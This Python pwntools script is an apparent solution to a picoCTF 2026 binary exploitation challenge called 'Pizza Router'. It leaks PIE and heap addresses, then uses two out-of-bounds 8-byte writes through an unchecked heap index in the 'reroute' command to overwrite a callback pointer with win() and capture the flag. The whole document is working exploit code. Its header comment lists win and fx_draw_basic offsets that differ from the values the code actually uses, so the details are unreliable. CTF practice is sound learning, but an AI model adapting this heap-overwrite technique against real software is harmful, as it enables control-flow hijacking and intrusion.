#!/usr/bin/env python3
# Pizza Router - picoCTF 2026 (Binary Exploitation, Hard/400) by Palash Oswal
# Bug: reroute <id> <heap_idx> <new_cost> uses heap_idx WITHOUT bounds check ->
#      OOB 8-byte write (dst_y*width+dst_x, new_cost) into order heap structure.
# Goal: overwrite fx_finish_dummy fn-ptr (heap+0x430) with win() then dispatch.
#
# Offsets recovered from binary symbol table (not stripped):
#   fx_draw_basic = 0x2260   win = 0x2460   ORD = 0x5080
# Order heap struct: entries list @ heap+0x18 ; finish callback @ heap+0x430
import re, sys
from pwn import *

context.log_level = "info"
context.arch = "amd64"

HOST = args.HOST or "mysterious-sea.picoctf.net"
PORT = int(args.PORT or 62065)

FX_DRAW_BASIC_OFF = 0x2270
WIN_OFF = 0x2480
ORD_OFF = 0x5080

CITY1_WIDTH = 16
TARGET_X = 1
TARGET_Y = 3
TARGET_ID = TARGET_Y * CITY1_WIDTH + TARGET_X  # 49 after id field rewrite

PROMPT = b"router> "


def to_i32(v):
    v &= 0xFFFFFFFF
    return v - 0x100000000 if v & 0x80000000 else v


def leak(text, name):
    m = re.search(rf"{name}=(0x[0-9a-fA-F]+)", text)
    if not m:
        raise ValueError(f"missing {name} in {text!r}")
    return int(m.group(1), 16)


def main():
    io = remote(HOST, PORT)
    io.recvuntil(PROMPT)

    def cmd(line):
        io.sendline(line.encode())
        return io.recvuntil(PROMPT).decode("latin1", "replace")

    cmd("load city1")
    cmd(f"add_order {TARGET_X} {TARGET_Y}")

    renderer = leak(cmd("replay 0"), "renderer")
    pie = renderer - FX_DRAW_BASIC_OFF
    win = pie + WIN_OFF
    ord_base = pie + ORD_OFF

    hint = leak(cmd("receipt 0"), "hint")  # order heap struct base
    log.info(f"pie={hex(pie)} win={hex(win)} ord={hex(ord_base)} heap={hex(hint)}")

    # 1st write: land 8-byte write at ORD[0]; low32 = id field, high32 = dst_x.
    # id becomes y*width+x = 49, dst_x becomes lsb32(win) - y*width.
    idx_to_ord = (ord_base - (hint + 0x18)) // 8
    new_x = to_i32((win & 0xFFFFFFFF) - TARGET_Y * CITY1_WIDTH)
    r1 = cmd(f"reroute 0 {to_i32(idx_to_ord)} {new_x}")
    log.info("reroute#1: " + r1.strip().replace(chr(27), ""))

    # 2nd write on order id 49: low32 = dst_y*width+dst_x = lsb32(win),
    # high32 = new_cost = msb32(win)  -> full win() into fx_finish_dummy slot.
    finish_idx = (hint + 0x430 - (hint + 0x18)) // 8  # == 131
    r2 = cmd(f"reroute {TARGET_ID} {to_i32(finish_idx)} {to_i32(win >> 32)}")
    log.info("reroute#2: " + r2.strip().replace(chr(27), ""))

    final = cmd(f"dispatch {TARGET_ID}")
    print(final)
    m = re.search(r"(picoCTF\{[^}]+\}|flag\{[^}]+\})", final)
    if m:
        print("\n[+] FLAG: " + m.group(1))
    io.close()
    return m.group(1) if m else None


if __name__ == "__main__":
    main()
